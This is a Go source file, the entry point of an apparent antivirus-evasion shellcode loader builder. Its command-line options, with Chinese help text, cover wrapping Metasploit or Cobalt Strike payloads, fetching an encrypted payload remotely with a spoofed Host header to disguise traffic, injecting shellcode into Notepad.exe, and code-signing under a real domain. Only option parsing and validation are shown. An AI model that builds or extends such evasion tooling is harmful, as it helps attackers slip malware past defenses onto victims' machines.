package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/sirupsen/logrus"
)

var (
	antiAV = config{}
)

func main() {
	initialize()
	antiAV.build()
}

func initialize() {
	flag.StringVar(&antiAV.os, "os", "windows", "OS: windows,linux")
	flag.StringVar(&antiAV.loader, "l", "sc", "支持的加载类型: sc")
	flag.StringVar(&antiAV.paylaod, "p", "payload.bin", `Payload: 
	1.支持 远程远程加载payload.e(参考payload.e生成实例)
	2.支持MSF payload generate by '-f raw'.
	3.支持CS raw payload.
	`)
	flag.StringVar(&antiAV.domain, "domain", "baidu.com", "代码签名,需填写实际存在的域名")
	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "远程加载payload.e时,在GET请求头中替换host实现流量混淆")
	flag.BoolVar(&antiAV.crypt, "e", false, `生成payload.e`)
	flag.BoolVar(&antiAV.inject, "inject", false, "开启注入模式, shellcode注入到Notepad.exe")
	flag.BoolVar(&antiAV.nosign, "nosign", false, "关闭签名")
	flag.Parse()

	if err := antiAV.validate(); err != nil {
		logrus.Error("[-]", err.Error())
		os.Exit(0)
	}

	logrus.SetFormatter(&logrus.TextFormatter{
		DisableColors:          false,
		DisableTimestamp:       true,
		FullTimestamp:          false,
		DisableLevelTruncation: false,
	})

}

func (c *config) validate() error {
	switch c.loader {
	case "sc":
		fallthrough
	case "pe":
	default:
		return fmt.Errorf("not Support Loader: %v", c.loader)
	}
	switch c.os {
	case "windows":
	default:
		return fmt.Errorf("not Support OS: %v", c.os)
	}
	if c.domain == "" {
		logrus.Warn("[-] Disable Sign")
	}

	return nil
}
